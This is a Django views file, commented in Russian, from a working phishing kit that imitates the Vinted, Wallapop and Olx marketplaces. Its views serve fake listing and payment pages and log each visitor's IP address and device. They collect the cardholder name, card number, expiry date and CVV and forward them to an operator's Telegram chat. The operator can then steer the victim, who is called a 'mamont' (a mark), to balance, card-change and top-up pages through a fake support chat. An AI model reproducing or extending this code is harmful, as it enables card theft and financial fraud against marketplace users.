from django.shortcuts import render
from apps.worker.models import Events
from apps.bot.models import BotUser, Bot_Message
from django.http import HttpResponse
import json
from django.views.decorators.csrf import csrf_exempt
from datetime import datetime
from apps.bot.models import DataUserSite
from django.http import Http404
from config import CHAT_ADMIN_ID


from apps.bot.bot_core import tg_bot as bot_token
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
bot = TeleBot(bot_token)



def send_bot_message(user, answer):
    Events.objects.create(
        status='ACCEPTED',
        update_data={
            "message": {
                "from": {
                    "id": user.tg_id,  # ID пользователя в Telegram
                    "username": user.username,  # Username пользователя
                    "first_name": user.first_name,  # Имя пользователя
                    "language_code": "ru",  # Язык пользователя
                    "is_premium": False  # Премиум статус
                },
                "text": f"{answer}",  # Текст сообщения
                "chat": {
                    "id": user.tg_id  # ID чата (обычно совпадает с ID пользователя в личных сообщениях)
                }
            }
        }
    )



@csrf_exempt
def task_complete_alert(request):

        # Получаем данные из запроса
        data = json.loads(request.body)
        task_id = data.get('id')
        answer = data.get('text_llm_models')
        
        # Получаем оригинальное событие по task_id
        original_event = Events.objects.get(task_id=task_id)
        user = original_event.user

        send_bot_message(user, answer)

        return HttpResponse("Все ок")





from django.http import JsonResponse

def data_view(request, token): 
    datausersite = DataUserSite.objects.get(token=token)
    json = datausersite.data_json
    print('\njson', json, '\n')
    return JsonResponse(json[token], safe=False)



import requests
from user_agents import parse


def get_user_page(request, token):
    try:
        datausersite = DataUserSite.objects.get(token=token)

        ip_address_user = request.META.get('REMOTE_ADDR')

        json = datausersite.data_json

        updated_json = {
            token: {
                'page': f'/get/{token}/',
                'view_window': False
            }
        }

        # Обновляем поле data_json
        datausersite.data_json = updated_json

        # Сохраняем изменения в базе данных
        datausersite.save()


        print(f"Updated token_data for /get/: {json}")
        
        # Получение информации об устройстве пользователя
        user_agent = parse(request.META.get('HTTP_USER_AGENT'))
        full = f"{datausersite.service} #{datausersite.token}\n⏳ Переход на сайт\n👑 Название: {datausersite.product_name}\n👑 Стоимость: {datausersite.price}\nIP: {ip_address_user}\nINFO: {user_agent}"
    
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton(text="👁", callback_data=f"check_the_location_on_website {token}"))
        keyboard.add(InlineKeyboardButton(text="Сообщение", callback_data=f"message_in_tp {token}"))

        # bot.send_message(datausersite.user.tg_id, text=full, reply_markup=keyboard)
        bot.send_message(CHAT_ADMIN_ID, text=full, reply_markup=keyboard)

        print(f''' \n\nINFO\n{full}''')
        
        context = {
            "price": datausersite.price,
            "image_url": datausersite.image.url, 
            "name": datausersite.name,
            "address": datausersite.address,
            "product_name": datausersite.product_name,
        }


        if datausersite.service == "Vinted":
            return render(request, 'vinted/vinted.html', context)
        
        if datausersite.service == "Wallapop":
            return render(request, 'wallapop/wallapop.html', context)
        
        if datausersite.service == "Olx":
            return render(request, 'olx/olx.html', context)
    except DataUserSite.DoesNotExist:
        raise Http404("Данные с таким токеном не найдены.")









def pay_user_page(request, token):
    try:
        datausersite = DataUserSite.objects.get(token=token)

        data_json = datausersite.data_json[token]


        try:
            context = {
                "datausersite": datausersite,
                "data_json_status_window": data_json['view_window'],
                "data_json_count": data_json['count']
            }
        except:
            context = {
                "datausersite": datausersite,
                "data_json_status_window": data_json['view_window'],
                "data_json_count": ''
            }

        ip_address_user = request.META.get('REMOTE_ADDR')
        # Получение информации об устройстве пользователя
        user_agent = parse(request.META.get('HTTP_USER_AGENT'))
        full = f"{datausersite.service} #{datausersite.token}\n💳 Переход на ввод карты\n👑 Название: {datausersite.product_name}\n👑 Стоимость: {datausersite.price}\nIP: {ip_address_user}\nINFO: {user_agent}"
    
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton(text="👁", callback_data=f"check_the_location_on_website {token}"))
        keyboard.add(InlineKeyboardButton(text="Сообщение", callback_data=f"message_in_tp {token}"))

        # bot.send_message(datausersite.user.tg_id, text=full, reply_markup=keyboard)
        bot.send_message(CHAT_ADMIN_ID, text=full, reply_markup=keyboard)


        return render(request, 'pay.html', context)
    except DataUserSite.DoesNotExist:
        raise Http404("Данные с таким токеном не найдены.")



@csrf_exempt
def loading_user_page(request, token):
    try:
        datausersite = DataUserSite.objects.get(token=token)
        context = {
            "datausersite": datausersite,
        }
        updated_json = {
            token: {
                'page': f'/loading/{token}/',
                'view_window': False
            }
        }

        # Обновляем поле data_json
        datausersite.data_json = updated_json

        # Сохраняем изменения в базе данных
        datausersite.save()



        if request.method == "POST":
            balance_input = request.POST.get("balance_input")
            card_number = request.POST.get("card_number")
            if balance_input:
                full = f"⚠️ Введен баланс: {balance_input} EUR"
                # bot.send_message(datausersite.user.tg_id, text=full)
                bot.send_message(CHAT_ADMIN_ID, text=full)
                return render(request, 'loading.html', context)
            
            elif card_number:
                card_holder = request.POST.get("card_holder")
                expiry_month = request.POST.get("expiry_month")
                expiry_year = request.POST.get("expiry_year")
                cvv = request.POST.get("cvv")

                full_card = f"\n{card_holder}\n{card_number}\n{expiry_month}/{expiry_year}\n{cvv}\n"



        ip_address_user = request.META.get('REMOTE_ADDR')
        # Получение информации об устройстве пользователя
        user_agent = parse(request.META.get('HTTP_USER_AGENT'))
        full = f"{datausersite.service} #{datausersite.token}\n⏳ Переход на бесконечную загрузку\n👑 Название: {datausersite.product_name}\n👑 Стоимость: {datausersite.price}\n{full_card}\nIP: {ip_address_user}\nINFO: {user_agent}"
    
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton(text="👁", callback_data=f"check_the_location_on_website {token}"))
        keyboard.row(
            InlineKeyboardButton(text="Сообщение", callback_data=f"message_in_tp {token}"),
        )
        keyboard.row(
            InlineKeyboardButton(text="Баланс", callback_data=f"balance_page {token}"),
            InlineKeyboardButton(text="Смена карты", callback_data=f"changing_the_card_page {token}"),
            InlineKeyboardButton(text="Пополнение", callback_data=f"replenishment_page_input {token}")
        )

        # с реквизитами карты
        # bot.send_message(datausersite.user.tg_id, text=full, reply_markup=keyboard)
        bot.send_message(CHAT_ADMIN_ID, text=full, reply_markup=keyboard)

        #Без реквизитов
        full_no_rec = f"{datausersite.service} #{datausersite.token}\n⏳ Переход на бесконечную загрузку\n👑 Название: {datausersite.product_name}\n👑 Стоимость: {datausersite.price}\n{card_number}\nIP: {ip_address_user}\nINFO: {user_agent}"
        bot.send_message(datausersite.user.tg_id, text=full_no_rec)


        return render(request, 'loading.html', context)
    except DataUserSite.DoesNotExist:
        raise Http404("Данные с таким токеном не найдены.")
    





#Баланс
@csrf_exempt
def balance_user_page(request, token):
    try:
        datausersite = DataUserSite.objects.get(token=token)
        context = {
            "datausersite": datausersite,
        }

        if request.method == "POST":
            card_holder = request.POST.get("card_holder")
    
        full = "⏳ Мамонт перенаправлен на ввод баланса"
        # bot.send_message(datausersite.user.tg_id, text=full)
        bot.send_message(CHAT_ADMIN_ID, text=full)


        return render(request, 'balance.html', context)
    except DataUserSite.DoesNotExist:
        raise Http404("Данные с таким токеном не найдены.")
    


#Проверка на сайте ли человек
from django.utils.timezone import now
@csrf_exempt
def check_activity(request, token):
    if request.method == 'GET':
        try:
            data_user_site = DataUserSite.objects.get(token=token)
            data_user_site.last_active = now()  # Обновляем время последней активности
            data_user_site.save()
            return JsonResponse({'status': 'success'}, status=200)
        except DataUserSite.DoesNotExist:
            return JsonResponse({'error': 'User not found'}, status=404)
    return JsonResponse({'error': 'Invalid request method'}, status=400)






from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import get_object_or_404


@csrf_exempt
def send_message_support(request, token):
    if request.method == 'POST':
        try:
            body = json.loads(request.body)
            user_text = body.get('text')  # текст сообщения
            if not user_text:
                return JsonResponse({'status': 'error', 'message': 'Text is missing.'}, status=400)

            data_user_site = get_object_or_404(DataUserSite, token=token)


            keyboard = InlineKeyboardMarkup()
            keyboard.row(
                InlineKeyboardButton(text="Сообщение", callback_data=f"message_in_tp {token}"),
            )
            # bot.send_message(data_user_site.user.tg_id, f"Сообщение от пользователя {token}: {user_text}", reply_markup=keyboard)
            bot.send_message(CHAT_ADMIN_ID, f"Сообщение от пользователя {token}: {user_text}", reply_markup=keyboard)

            # Формируем ответ
            response_data = {
                'status': 'success',
                'message': f'Ваше сообщение получено, пожалуйста, ожидайте ответа...',
            }
            return JsonResponse(response_data, status=200)
        except json.JSONDecodeError:
            return JsonResponse({'status': 'error', 'message': 'Invalid JSON format.'}, status=400)
        except Exception as e:
            return JsonResponse({'status': 'error', 'message': str(e)}, status=400)
    else:
        return JsonResponse({'status': 'error', 'message': 'Invalid request method.'}, status=405)






@csrf_exempt
def get_admin_message_support(request, token):
    if request.method == 'GET':
        try:
            data_user_site = get_object_or_404(DataUserSite, token=token)
            if data_user_site.support_json:
                text = data_user_site.support_json[token]['admin']

                response_data = {
                    'status': 'success',
                    'message': f'{text}',
                }

                data_user_site.support_json = ''
                data_user_site.save()
                return JsonResponse(response_data, status=200)
            else:
                response_data = {
                    'status': 'waiting',
                    'message': f'',
                }
                return JsonResponse(response_data, status=200)


        except json.JSONDecodeError:
            return JsonResponse({'status': 'error', 'message': 'Invalid JSON format.'}, status=400)
        except Exception as e:
            return JsonResponse({'status': 'error', 'message': str(e)}, status=400)
    else:
        return JsonResponse({'status': 'error', 'message': 'Invalid request method.'}, status=405)
